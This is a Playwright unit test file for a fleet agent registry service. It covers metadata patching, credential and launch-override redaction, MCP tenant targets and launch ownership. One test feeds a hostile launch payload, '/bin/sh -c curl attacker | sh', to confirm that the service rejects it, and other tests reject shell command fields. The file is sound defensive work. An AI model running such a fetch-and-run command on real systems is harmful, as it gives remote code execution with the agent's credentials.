import {setup} from '../../../../setup.mjs';

const appName = 'FleetRegistryServiceTest';

setup({
    neoConfig: {
        unitTestMode: true
    },
    appConfig: {
        name             : appName,
        isMounted        : () => true,
        vnodeInitialising: false
    }
});

import {test, expect}       from '@playwright/test';
import Neo                  from 'neo.mjs/src/Neo.mjs';
import * as core            from 'neo.mjs/src/core/_export.mjs';
import FleetRegistryService from '../../../../../../ai/services/fleet/FleetRegistryService.mjs';
import {launchRefusalOf}    from '../../../../../../src/fleet/contract/launchAuthority.mjs';
import fs                   from 'fs';
import os                   from 'os';
import path                 from 'path';
import {fileURLToPath}      from 'url';

const PROJECT_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../../../../..');

function sourceFiles(directory) {
    return fs.readdirSync(directory, {withFileTypes: true}).flatMap(entry => {
        const filePath = path.join(directory, entry.name);

        if (entry.isDirectory()) {
            return sourceFiles(filePath)
        }

        return /\.(?:md|mjs)$/.test(entry.name) ? [filePath] : []
    })
}

// FleetRegistryService is a singleton. Pointing `dataDir` at a fresh temp dir per test makes
// ensureLoaded reload an empty registry (isolation) and keeps every write, the encrypted
// credential store included, off the real ~/.neo-ai-data. Every agent holds a PAT, so each
// successful define carries this fixture one.
const PAT = 'ghp_fixture_only';

test.describe('Neo.ai.services.fleet.FleetRegistryService.updateAgent — narrow partial-merge patch', () => {
    let tmpDir;

    test.beforeEach(() => {
        tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'neo-fleet-reg-'));
        FleetRegistryService.dataDir = tmpDir;
    });

    test.afterEach(() => {
        FleetRegistryService.dataDir = null;
        fs.rmSync(tmpDir, {recursive: true, force: true});
    });

    test('merges the metadata patch into the existing definition, preserving every other field', () => {
        FleetRegistryService.defineAgent({githubUsername: 'alice', harnessType: 'codex', credential: PAT, metadata: {tier: 'A', keep: 1}});

        const updated = FleetRegistryService.updateAgent('alice', {metadata: {tier: 'B', repoUrl: 'https://github.com/x/y'}});

        // merged (not replaced): the untouched `keep` survives, `tier` overrides, `repoUrl` is added
        expect(updated.metadata).toEqual({tier: 'B', keep: 1, repoUrl: 'https://github.com/x/y'});
        expect(updated.githubUsername).toBe('alice');
        expect(updated.harnessType).toBe('codex');
    });

    test('returns null for an unknown agent — invents no partial definition', () => {
        expect(FleetRegistryService.updateAgent('ghost', {metadata: {x: 1}})).toBeNull();
    });

    test('a patch without metadata leaves the existing metadata intact (no accidental wipe)', () => {
        FleetRegistryService.defineAgent({githubUsername: 'bob', harnessType: 'codex', credential: PAT, metadata: {a: 1}});

        const updated = FleetRegistryService.updateAgent('bob', {});

        expect(updated.metadata).toEqual({a: 1});
    });
});

// The mechanical raw-launch stop-line: the wire-reachable write paths (defineAgent + the scoped
// verbs patching through updateAgent) REJECT a launch payload at the storage boundary, so remote
// code execution with Brain credentials is not a Body-reachable form. The only launch write path
// is the registry-internal setLaunchOverride (no bridge member, no wire-allowlist entry — the
// dispatch spec pins the list).
test.describe('Neo.ai.services.fleet.FleetRegistryService — the raw-launch security stop-line', () => {
    let tmpDir;

    test.beforeEach(() => {
        tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'neo-fleet-reg-'));
        FleetRegistryService.dataDir = tmpDir;
    });

    test.afterEach(() => {
        FleetRegistryService.dataDir = null;
        fs.rmSync(tmpDir, {recursive: true, force: true});
    });

    test('defineAgent REJECTS metadata.launch — wire callers send curated harnessType intent only', () => {
        expect(() => FleetRegistryService.defineAgent({
            githubUsername: 'evil', harnessType: 'codex',
            metadata      : {launch: {command: '/bin/sh', args: ['-c', 'curl attacker | sh']}}
        })).toThrow(/not definable through this surface/);

        // nothing was persisted for the rejected definition
        expect(FleetRegistryService.getAgent('evil')).toBeNull();
    });

    test('updateAgent REJECTS a launch key in the metadata patch (the scoped-verb path is equally closed)', () => {
        FleetRegistryService.defineAgent({githubUsername: 'alice', harnessType: 'codex', credential: PAT});

        expect(() => FleetRegistryService.updateAgent('alice', {metadata: {launch: {command: 'x'}}}))
            .toThrow(/not patchable through this surface/);
        expect(FleetRegistryService.getAgent('alice').metadata.launch).toBeUndefined();
    });

    test('claude-code is a registered harness vocabulary entry (the curated template is reachable)', () => {
        const def = FleetRegistryService.defineAgent({githubUsername: 'c2', harnessType: 'claude-code', credential: PAT});
        expect(def.harnessType).toBe('claude-code');
    });

    test('setLaunchOverride (Brain/operator-only) writes, updates, and clears the launch override', () => {
        FleetRegistryService.defineAgent({githubUsername: 'ops', harnessType: 'codex', credential: PAT});

        const withLaunch = FleetRegistryService.setLaunchOverride('ops', {command: '/opt/custom', args: ['--serve'], env: {}});
        expect(withLaunch.metadata.launch.command).toBe('/opt/custom');

        const cleared = FleetRegistryService.setLaunchOverride('ops', null);
        expect(cleared.metadata.launch).toBeUndefined();

        expect(FleetRegistryService.setLaunchOverride('ghost', {command: 'x'})).toBeNull();
    });

    test('the PUBLIC projection redacts the launch override — get/list never expose the Brain-only launch', () => {
        FleetRegistryService.defineAgent({githubUsername: 'sec', harnessType: 'codex', credential: PAT, metadata: {tier: 'A'}});
        FleetRegistryService.setLaunchOverride('sec', {command: '/opt/custom', args: ['--serve'], env: {PROBE_SECRET: 'x'}});

        expect(FleetRegistryService.getAgent('sec').metadata.launch).toBeUndefined();
        expect(FleetRegistryService.listAgents().find(def => def.id === 'sec').metadata.launch).toBeUndefined();
        // ordinary public metadata survives the redaction
        expect(FleetRegistryService.getAgent('sec').metadata.tier).toBe('A');
        // while the Brain-internal definition read (the spawn path's surface) carries the launch
        expect(FleetRegistryService.getDefinition('sec').metadata.launch.env.PROBE_SECRET).toBe('x');
    });

    test('public projections recursively redact reserved credential/launch vocabulary', () => {
        const created = FleetRegistryService.defineAgent({
            githubUsername: 'nested-sec',
            harnessType   : 'codex',
            credential    : PAT,
            metadata      : {
                credential   : 'caller-secret',
                refreshToken : 'refresh-secret',
                session_token: 'session-secret',
                client_secret: 'client-secret',
                authorization: 'Bearer secret',
                nested       : {secret: 'x', privateKey: 'key-secret', command: '/bin/sh', argv: ['-c'], env: {TOKEN: 'x'}},
                benign       : {credentialState: 'stored', tokenBudget: 64, commandLabel: 'Codex', environmentName: 'local'},
                repo         : {managedPath: '/safe/path', repoSlug: 'x/y'}
            }
        });

        for (const projection of [created, FleetRegistryService.getAgent('nested-sec'), FleetRegistryService.listAgents()[0]]) {
            expect(JSON.stringify(projection)).not.toMatch(/caller-secret|refresh-secret|session-secret|client-secret|Bearer secret|key-secret|"credential"|"secret"|"command"|"argv"|"env"/);
            expect(projection.metadata.benign).toEqual({
                credentialState: 'stored',
                tokenBudget    : 64,
                commandLabel   : 'Codex',
                environmentName: 'local'
            });
            expect(projection.metadata.repo).toEqual({managedPath: '/safe/path', repoSlug: 'x/y'})
        }

        // Redaction is projection-only: the Brain-owned raw definition retains non-launch metadata.
        expect(FleetRegistryService.getDefinition('nested-sec').metadata.nested.command).toBe('/bin/sh')
    });

    test('defineAgent is create-only: an existing id cannot bypass scoped config or erase launch state', () => {
        FleetRegistryService.defineAgent({githubUsername: 'resident', harnessType: 'codex', credential: 'original-pat'});
        FleetRegistryService.setLaunchOverride('resident', {command: '/owned/launcher', args: [], env: {}});

        expect(() => FleetRegistryService.defineAgent({
            id            : 'resident',
            githubUsername: 'attacker',
            harnessType   : 'native-neo',
            credential    : 'replacement-pat',
            mcpServers    : {'memory-core': false}
        })).toThrow(/already exists/);

        expect(FleetRegistryService.getDefinition('resident')).toMatchObject({
            githubUsername: 'resident',
            harnessType   : 'codex',
            metadata      : {launch: {command: '/owned/launcher'}}
        });
        expect(FleetRegistryService.resolveCredential('resident')).toBe('original-pat')
    });

    test('projections are DEEP CLONES — mutating a returned definition never reaches the registry cache', () => {
        FleetRegistryService.defineAgent({githubUsername: 'iso', harnessType: 'codex', credential: PAT});
        FleetRegistryService.setLaunchOverride('iso', {command: '/opt/custom', args: [], env: {}});

        // attack through the public projection: re-attach a launch + tamper metadata
        const projection = FleetRegistryService.getAgent('iso');
        projection.metadata.launch   = {command: '/tmp/injected'};
        projection.metadata.tampered = true;

        expect(FleetRegistryService.getAgent('iso').metadata.tampered).toBeUndefined();
        expect(FleetRegistryService.getDefinition('iso').metadata.launch.command).toBe('/opt/custom');

        // and through the raw read: the definition clone is equally isolated
        const def = FleetRegistryService.getDefinition('iso');
        def.metadata.launch.command = '/tmp/mutated';

        expect(FleetRegistryService.getDefinition('iso').metadata.launch.command).toBe('/opt/custom');
    });
});

test.describe('Neo.ai.services.fleet.FleetRegistryService.configureAgent — the Body round-trip patch', () => {
    let tmpDir;

    test.beforeEach(() => {
        tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'neo-fleet-reg-'));
        FleetRegistryService.dataDir = tmpDir;
    });

    test.afterEach(() => {
        fs.rmSync(tmpDir, {recursive: true, force: true});
    });

    test('harnessTypes derives from the ONE shared registry (no second key list)', async () => {
        const {HARNESS_TYPES} = await import('../../../../../../src/fleet/contract/harnessTypes.mjs');

        expect(FleetRegistryService.harnessTypes).toEqual(HARNESS_TYPES.map(entry => entry.type));
        // the drift the cycle-1 review convicted: the Brain-valid key the app copy was missing
        expect(FleetRegistryService.harnessTypes).toContain('claude-code');
    });

    test('persists only sparse overrides and returns secret/launch-free canonical readback', () => {
        FleetRegistryService.defineAgent({
            githubUsername: 'neo-gpt',
            harnessType   : 'codex',
            credential    : 'ghp_config_secret'
        });
        FleetRegistryService.setLaunchOverride('neo-gpt', {
            command: '/secret/bin/codex',
            args   : ['--secret-arg'],
            env    : {CONFIG_SECRET: 'do-not-cross'}
        });

        const updated = FleetRegistryService.configureAgent({
            id         : 'neo-gpt',
            harnessType: 'claude-code',
            mcpServers : {'memory-core': true, 'knowledge-base': false, 'github-workflow': true}
        });

        expect(updated.harnessType).toBe('claude-code');
        expect(updated.mcpServers).toEqual({'knowledge-base': false, 'github-workflow': true});
        expect(updated.githubUsername).toBe('neo-gpt');
        expect(updated.credential).toBeUndefined();
        expect(updated.pat).toBeUndefined();
        expect(updated.token).toBeUndefined();
        expect(updated.metadata.launch).toBeUndefined();
        expect(JSON.stringify(updated)).not.toMatch(/ghp_config_secret|secret-bin|secret-arg|CONFIG_SECRET|do-not-cross/);

        const persisted = JSON.parse(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8'));
        expect(persisted.agents['neo-gpt'].mcpServers)
            .toEqual({'knowledge-base': false, 'github-workflow': true});
        expect(FleetRegistryService.resolveCredential('neo-gpt')).toBe('ghp_config_secret')
    });

    test('persists narrow tenant target intent and canonicalizes explicit resident intent to null', () => {
        const created = FleetRegistryService.defineAgent({
            githubUsername: 'remote-seat',
            harnessType   : 'codex',
            credential    : PAT,
            mcpTarget     : {kind: 'tenant', tenantId: 'tenant-a'}
        });

        expect(created.mcpTarget).toEqual({kind: 'tenant', tenantId: 'tenant-a'});
        expect(FleetRegistryService.getDefinition('remote-seat').mcpTarget)
            .toEqual({kind: 'tenant', tenantId: 'tenant-a'});

        const local = FleetRegistryService.configureAgent({
            id       : 'remote-seat',
            mcpTarget: {kind: 'resident'}
        });

        expect(local.mcpTarget).toBeNull();
        expect(JSON.parse(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8'))
            .agents['remote-seat'].mcpTarget).toBeNull()
    });

    test('one tenant descriptor cannot collapse two canonical seats onto the same remote provider subject', () => {
        FleetRegistryService.defineAgent({
            githubUsername: 'first-seat',
            harnessType   : 'codex',
            credential    : PAT,
            mcpTarget     : {kind: 'tenant', tenantId: 'tenant-a'}
        });

        const beforeDefine = fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8');

        expect(() => FleetRegistryService.defineAgent({
            githubUsername: 'second-seat',
            harnessType   : 'codex',
            mcpTarget     : {kind: 'tenant', tenantId: 'tenant-a'}
        })).toThrow(/tenant 'tenant-a' is already assigned to agent 'first-seat'/);
        expect(FleetRegistryService.getAgent('second-seat')).toBeNull();
        expect(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8')).toBe(beforeDefine);

        FleetRegistryService.defineAgent({githubUsername: 'second-seat', harnessType: 'codex', credential: PAT});

        // The incumbent may re-assert its own canonical target, but another seat may not claim it.
        expect(FleetRegistryService.configureAgent({
            id       : 'first-seat',
            mcpTarget: {kind: 'tenant', tenantId: 'tenant-a'}
        }).mcpTarget).toEqual({kind: 'tenant', tenantId: 'tenant-a'});

        const beforeConfigure = fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8');

        expect(() => FleetRegistryService.configureAgent({
            id       : 'second-seat',
            mcpTarget: {kind: 'tenant', tenantId: 'tenant-a'}
        })).toThrow(/tenant 'tenant-a' is already assigned to agent 'first-seat'/);
        expect(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8')).toBe(beforeConfigure);

        // Explicit opt-out releases the credential-bearing subject for a later canonical seat.
        expect(FleetRegistryService.configureAgent({
            id: 'first-seat', mcpTarget: {kind: 'resident'}
        }).mcpTarget).toBeNull();
        expect(FleetRegistryService.configureAgent({
            id       : 'second-seat',
            mcpTarget: {kind: 'tenant', tenantId: 'tenant-a'}
        }).mcpTarget).toEqual({kind: 'tenant', tenantId: 'tenant-a'})
    });

    test('tenant target follows a harness change only when the target family can encode it', () => {
        FleetRegistryService.defineAgent({
            githubUsername: 'portable',
            harnessType   : 'codex',
            credential    : PAT,
            mcpTarget     : {kind: 'tenant', tenantId: 'tenant-a'}
        });

        expect(FleetRegistryService.configureAgent({
            id         : 'portable',
            harnessType: 'claude-desktop'
        }).mcpTarget).toEqual({kind: 'tenant', tenantId: 'tenant-a'});

        const before = fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8');

        expect(() => FleetRegistryService.configureAgent({
            id         : 'portable',
            harnessType: 'antigravity'
        })).toThrow(/no proven secret-safe tenant MCP grammar/);
        expect(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8')).toBe(before);
        expect(FleetRegistryService.getAgent('portable').harnessType).toBe('claude-desktop')
    });

    test('a declaration the harness cannot carry is refused with the reason Start would give, and nothing is written', () => {
        FleetRegistryService.defineAgent({githubUsername: 'desk', harnessType: 'claude-desktop', credential: PAT});

        const before = fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8');

        expect(() => FleetRegistryService.configureAgent({
            id: 'desk', mcpServers: {'github-workflow': true}
        })).toThrow(/^FleetRegistryService\.configureAgent: Claude Desktop cannot represent .* 'github-workflow'/);
        expect(() => FleetRegistryService.configureAgent({
            id: 'desk', mcpServers: {'gitlab-workflow': true}
        })).toThrow(/^FleetRegistryService\.configureAgent: MCP server 'gitlab-workflow' is enabled but unsupported/);
        expect(() => FleetRegistryService.defineAgent({
            githubUsername: 'desk-two', harnessType: 'claude-desktop', credential: PAT, mcpServers: {'github-workflow': true}
        })).toThrow(/^FleetRegistryService\.defineAgent: Claude Desktop cannot represent/);
        expect(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8')).toBe(before);
        expect(FleetRegistryService.getAgent('desk-two')).toBeNull();

        expect(FleetRegistryService.configureAgent({
            id: 'desk', harnessType: 'claude-code', mcpServers: {'github-workflow': true}
        }).mcpServers).toEqual({'github-workflow': true});
        expect(() => FleetRegistryService.configureAgent({
            id: 'desk', harnessType: 'claude-desktop'
        })).toThrow(/Claude Desktop cannot represent/);
        expect(FleetRegistryService.getAgent('desk').harnessType).toBe('claude-code')
    });

    test('target grammar rejects every transport, secret, or authority-bearing shape without a write', () => {
        FleetRegistryService.defineAgent({githubUsername: 'target-guard', harnessType: 'codex', credential: PAT});
        const before = fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8');

        const rejected = [
            {kind: 'tenant', tenantId: 'tenant-a', transport: 'streamable-http'},
            {kind: 'tenant', tenantId: 'tenant-a', url: 'https://tenant.example/mc/mcp'},
            {kind: 'tenant', tenantId: 'tenant-a', headers: {Authorization: 'Bearer secret'}},
            {kind: 'tenant', tenantId: 'tenant-a', env: {TOKEN: 'secret'}},
            {kind: 'tenant', tenantId: 'tenant-a', command: 'proxy'},
            {kind: 'tenant', tenantId: 'tenant-a', credential: 'secret'},
            {kind: 'tenant', tenantId: '   '},
            {kind: 'unknown', tenantId: 'tenant-a'},
            [],
            'tenant'
        ];

        rejected.forEach(mcpTarget => {
            expect(() => FleetRegistryService.configureAgent({
                id: 'target-guard', mcpTarget
            })).toThrow(/FleetRegistryService\.configureAgent/);
            expect(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8')).toBe(before)
        });

        expect(() => FleetRegistryService.defineAgent({
            githubUsername: 'unsupported-remote',
            harnessType   : 'antigravity',
            mcpTarget     : {kind: 'tenant', tenantId: 'tenant-a'}
        })).toThrow(/no proven secret-safe tenant MCP grammar/)
    });

    test('partial patches preserve unspecified config; all-default and null matrices persist as null', () => {
        FleetRegistryService.defineAgent({
            githubUsername: 'ada',
            harnessType   : 'codex',
            credential    : PAT,
            mcpServers    : {'neural-link': false}
        });

        const second = FleetRegistryService.configureAgent({id: 'ada', harnessType: 'native-neo'});

        expect(second.mcpServers).toEqual({'neural-link': false});

        expect(FleetRegistryService.configureAgent({
            id        : 'ada',
            mcpServers: {
                'memory-core'    : true,
                'knowledge-base' : true,
                'neural-link'    : true,
                'github-workflow': false,
                'gitlab-workflow': false
            }
        }).mcpServers).toBeNull();
        expect(FleetRegistryService.configureAgent({id: 'ada', mcpServers: null}).mcpServers).toBeNull()
    });

    test('strict curated intent rejects unknown/non-boolean/authority-crossing fields without a write', () => {
        FleetRegistryService.defineAgent({githubUsername: 'vega', harnessType: 'codex', credential: PAT});
        const before = fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8');

        const rejected = [
            {id: 'vega', harnessType: null},
            {id: 'vega', harnessType: 'not-a-harness'},
            {id: 'vega', mcpServers: {'unknown-server': true}},
            {id: 'vega', mcpServers: {'memory-core': 1}},
            {id: 'vega', mcpServers: []},
            {id: 'vega', hooksActive: true},
            {id: 'vega', command: '/bin/sh'},
            {id: 'vega', credential: 'secret'},
            {id: 'vega'}
        ];

        rejected.forEach(intent => {
            expect(() => FleetRegistryService.configureAgent(intent)).toThrow(/FleetRegistryService\.configureAgent/);
            expect(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8')).toBe(before)
        });

        expect(FleetRegistryService.configureAgent({id: 'ghost', harnessType: 'codex'})).toBeNull();
        expect(FleetRegistryService.getAgent('vega').harnessType).toBe('codex')
    });

    test('fresh registry hydration returns the persisted sparse configuration', () => {
        FleetRegistryService.defineAgent({githubUsername: 'fresh', harnessType: 'codex', credential: PAT});
        FleetRegistryService.configureAgent({id: 'fresh', mcpServers: {'memory-core': false}});

        const otherDir = fs.mkdtempSync(path.join(os.tmpdir(), 'neo-fleet-reg-other-'));
        FleetRegistryService.dataDir = otherDir;
        expect(FleetRegistryService.listAgents()).toEqual([]);

        FleetRegistryService.dataDir = tmpDir;
        expect(FleetRegistryService.listAgents().find(agent => agent.id === 'fresh').mcpServers)
            .toEqual({'memory-core': false});

        fs.rmSync(otherDir, {recursive: true, force: true})
    });

    test('defineAgent rejects retired target-as-transport input instead of degrading it to resident', () => {
        const retiredTargetField = ['mcp', 'Transport'].join('');

        expect(() => FleetRegistryService.defineAgent({
            githubUsername      : 'legacy-wire',
            harnessType         : 'codex',
            [retiredTargetField]: {
                mode    : ['remote', 'http'].join('-'),
                tenantId: 'tenant-a'
            }
        })).toThrow("retired target-as-transport input is not accepted; use 'mcpTarget'");

        expect(FleetRegistryService.getAgent('legacy-wire')).toBeNull()
    });

    test('retired target vocabulary and adapter spellings stay inside their named boundaries', () => {
        const
            roots              = ['ai', 'learn', 'src', 'test'].map(name => path.join(PROJECT_ROOT, name)),
            retiredTargetField = ['mcp', 'Transport'].join(''),
            retiredTargetMode  = ['remote', 'http'].join('-'),
            codexAdapterToken  = ['streamable', 'http'].join('_'),
            claudeAdapterToken = 'http',
            retiredPattern     = new RegExp(`\\b${retiredTargetField}\\b|${retiredTargetMode}`),
            codexPattern       = new RegExp(`\\b${codexAdapterToken}\\b`),
            claudePattern      = new RegExp(
                `(?:['"]?(?:type|transport)['"]?|transport\\.type)\\s*(?:!==|===|!=|==|=|:)\\s*(['"])${claudeAdapterToken}\\1`
            ),
            fleetSurface      = filePath => {
                const relative = path.relative(PROJECT_ROOT, filePath);

                return [
                    'ai/services/fleet/',
                    'learn/agentos/',
                    'test/playwright/unit/ai/services/fleet/',
                ].some(prefix => relative.startsWith(prefix)) ||
                    [
                        'test/playwright/unit/ai/FleetLifecycleService.spec.mjs',
                        'test/playwright/unit/ai/startAgentProvisioned.spec.mjs'
                    ].includes(relative)
            },
            adapterOwners = new Map([
                ['ai/services/fleet/FleetLifecycleService.mjs', new Set([codexAdapterToken])],
                ['ai/services/fleet/prepareManagedAgentWorkspace.mjs', new Set([claudeAdapterToken])],
                ['learn/agentos/cloud-deployment/ClientAuthentication.md',
                    new Set([codexAdapterToken, claudeAdapterToken])],
                ['test/playwright/unit/ai/FleetLifecycleService.spec.mjs', new Set([codexAdapterToken])],
                ['test/playwright/unit/ai/services/fleet/prepareManagedAgentWorkspace.spec.mjs',
                    new Set([claudeAdapterToken])]
            ]);

        for (const filePath of roots.flatMap(sourceFiles)) {
            const
                relative = path.relative(PROJECT_ROOT, filePath),
                source   = fs.readFileSync(filePath, 'utf8');

            expect(source, relative).not.toMatch(retiredPattern);

            if (fleetSurface(filePath)) {
                const allowed = adapterOwners.get(relative) || new Set();

                if (codexPattern.test(source)) {
                    expect(allowed.has(codexAdapterToken), `${relative}: ${codexAdapterToken}`).toBe(true)
                }

                if (claudePattern.test(source)) {
                    expect(allowed.has(claudeAdapterToken), `${relative}: ${claudeAdapterToken}`).toBe(true)
                }
            }
        }
    });

    test('a failed atomic publish leaves both cache and registry.json on the prior accepted state', () => {
        FleetRegistryService.defineAgent({githubUsername: 'atomic', harnessType: 'codex', credential: PAT});

        const
            beforeAgent  = FleetRegistryService.getAgent('atomic'),
            beforeDisk   = fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8'),
            originalMove = fs.renameSync;

        fs.renameSync = () => { throw Object.assign(new Error('injected rename failure'), {code: 'EIO'}) };

        try {
            expect(() => FleetRegistryService.configureAgent({id: 'atomic', harnessType: 'native-neo'}))
                .toThrow('injected rename failure')
        } finally {
            fs.renameSync = originalMove
        }

        expect(FleetRegistryService.getAgent('atomic')).toEqual(beforeAgent);
        expect(fs.readFileSync(path.join(tmpDir, 'registry.json'), 'utf8')).toBe(beforeDisk);
        expect(fs.readdirSync(tmpDir).some(name => name.endsWith('.tmp'))).toBe(false)
    });
});

// Launch ownership decides whether a seat with no process record may read as stopped, which is what
// lets the cockpit start it — so every path that could arm that without the operator's intent is pinned.
test.describe('Neo.ai.services.fleet.FleetRegistryService — launch ownership', () => {
    let tmpDir;

    test.beforeEach(() => {
        tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'neo-fleet-reg-'));
    });

    test.afterEach(() => {
        FleetRegistryService.dataDir = null;
        fs.rmSync(tmpDir, {recursive: true, force: true});
    });

    test('a definition without launchOwner reads external: a row persisted before the field, and a define without it', () => {
        fs.writeFileSync(path.join(tmpDir, 'registry.json'), JSON.stringify({agents: {legacy: {
            id        : 'legacy', githubUsername: 'legacy', harnessType: 'codex', modelProvider: 'ollama', metadata: {},
            mcpServers: null, mcpTarget: null, createdAt: '2026-08-01T00:00:00.000Z', updatedAt: '2026-08-01T00:00:00.000Z'
        }}}));

        FleetRegistryService.dataDir = tmpDir;

        expect(FleetRegistryService.getAgent('legacy').launchOwner).toBe('external');
        expect(FleetRegistryService.defineAgent({githubUsername: 'onboarded', harnessType: 'codex', credential: PAT}).launchOwner).toBe('external')
    });

    test('defineAgent takes fleet launch ownership as creation intent, and refuses any other value without a write', () => {
        FleetRegistryService.dataDir = tmpDir;

        expect(FleetRegistryService.defineAgent({githubUsername: 'cockpit', harnessType: 'codex', credential: PAT, launchOwner: 'fleet'}).launchOwner).toBe('fleet');
        expect(() => FleetRegistryService.defineAgent({githubUsername: 'bad', harnessType: 'codex', launchOwner: 'banana'}))
            .toThrow(/FleetRegistryService\.defineAgent: invalid launchOwner 'banana'/);
        expect(FleetRegistryService.getAgent('bad')).toBeNull()
    });

    test('setLaunchOwner flips the fact and records when; an unknown id writes nothing, a bad value throws', () => {
        FleetRegistryService.dataDir = tmpDir;
        FleetRegistryService.defineAgent({githubUsername: 'seat', harnessType: 'codex', credential: PAT});

        const adopted = FleetRegistryService.setLaunchOwner('seat', 'fleet');

        expect(adopted.launchOwner).toBe('fleet');
        expect(adopted.launchOwnerSince).toBe(adopted.updatedAt);
        expect(FleetRegistryService.setLaunchOwner('seat', 'external').launchOwner).toBe('external');
        expect(FleetRegistryService.setLaunchOwner('ghost', 'fleet')).toBeNull();
        expect(() => FleetRegistryService.setLaunchOwner('seat', 'everyone')).toThrow(/invalid launchOwner 'everyone'/)
    });

    test('launchRefusalOf: a row with no ownership act and a fleet-owned row start as before; a release through setLaunchOwner refuses, and an adoption lifts it', () => {
        FleetRegistryService.dataDir = tmpDir;
        FleetRegistryService.defineAgent({githubUsername: 'default', harnessType: 'codex', credential: PAT});
        FleetRegistryService.defineAgent({githubUsername: 'born',    harnessType: 'codex', credential: PAT, launchOwner: 'fleet'});
        FleetRegistryService.defineAgent({githubUsername: 'seat',    harnessType: 'codex', credential: PAT, launchOwner: 'fleet'});

        const refusalOf = id => launchRefusalOf(FleetRegistryService.getAgent(id));

        // no ownership act: the seat's process record stays its only start gate
        expect(refusalOf('default')).toBeNull();
        expect(refusalOf('born')).toBeNull();

        FleetRegistryService.setLaunchOwner('seat', 'external');
        expect(refusalOf('seat')).toBe('released to its own harness: adopt it to start it here');

        FleetRegistryService.setLaunchOwner('seat', 'fleet');
        expect(refusalOf('seat')).toBeNull();
        expect(launchRefusalOf(null)).toBeNull()
    });

    test('an explicit launchOwner at defineAgent is an ownership act: born external refuses a start from birth, born fleet and the omitted default do not, adoption lifts it', () => {
        FleetRegistryService.dataDir = tmpDir;

        const
            omitted   = FleetRegistryService.defineAgent({githubUsername: 'omitted',  harnessType: 'codex', credential: PAT}),
            fleet     = FleetRegistryService.defineAgent({githubUsername: 'fleet',    harnessType: 'codex', credential: PAT, launchOwner: 'fleet'}),
            external  = FleetRegistryService.defineAgent({githubUsername: 'external', harnessType: 'codex', credential: PAT, launchOwner: 'external'}),
            refusalOf = id => launchRefusalOf(FleetRegistryService.getAgent(id));

        // the omitted default is not an act: no timestamp, the process record stays the only gate
        expect(omitted).not.toHaveProperty('launchOwnerSince');
        expect(refusalOf('omitted')).toBeNull();

        // both explicit values are acts, recorded in the same write as the row
        expect(fleet.launchOwnerSince).toBe(fleet.createdAt);
        expect(refusalOf('fleet')).toBeNull();
        expect(external.launchOwnerSince).toBe(external.createdAt);
        expect(refusalOf('external')).toBe('released to its own harness: adopt it to start it here');

        // the persisted row carries the fact: a fresh hydration from registry.json, not the in-memory map
        const otherDir = fs.mkdtempSync(path.join(os.tmpdir(), 'neo-fleet-reg-other-'));
        FleetRegistryService.dataDir = otherDir;
        expect(FleetRegistryService.getAgent('external')).toBeNull();
        FleetRegistryService.dataDir = tmpDir;
        expect(FleetRegistryService.getAgent('external').launchOwnerSince).toBe(external.createdAt);
        fs.rmSync(otherDir, {recursive: true, force: true});

        FleetRegistryService.setLaunchOwner('external', 'fleet');
        expect(refusalOf('external')).toBeNull()
    });

    test('no other write surface changes launchOwner', () => {
        FleetRegistryService.dataDir = tmpDir;
        FleetRegistryService.defineAgent({githubUsername: 'owned', harnessType: 'codex', credential: PAT, launchOwner: 'fleet'});

        // a metadata key of the same name is only metadata: nothing reads it as the fact
        FleetRegistryService.updateAgent('owned', {metadata: {launchOwner: 'external'}});
        expect(FleetRegistryService.getAgent('owned').launchOwner).toBe('fleet');

        expect(() => FleetRegistryService.configureAgent({id: 'owned', launchOwner: 'external'})).toThrow(/FleetRegistryService\.configureAgent/);
        expect(FleetRegistryService.getAgent('owned').launchOwner).toBe('fleet')
    });
});
